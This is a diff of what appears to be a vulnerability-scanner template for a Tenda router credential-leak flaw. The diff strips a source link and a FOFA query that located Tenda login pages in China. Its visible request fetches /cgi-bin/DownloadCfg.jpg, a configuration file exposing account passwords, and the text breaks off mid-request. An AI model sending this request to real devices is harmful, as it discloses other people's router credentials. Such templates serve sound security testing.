@@ -3,12 +3,8 @@ info:
   name: Tenda DownloadCfg.jpg 账号密码泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ie5krhagoi4q0vsf'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ie5krhagoi4q0vsf
-    fofa: title="Tenda | LOGIN" && country="CN"
 http:
 - raw:
   - 'GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
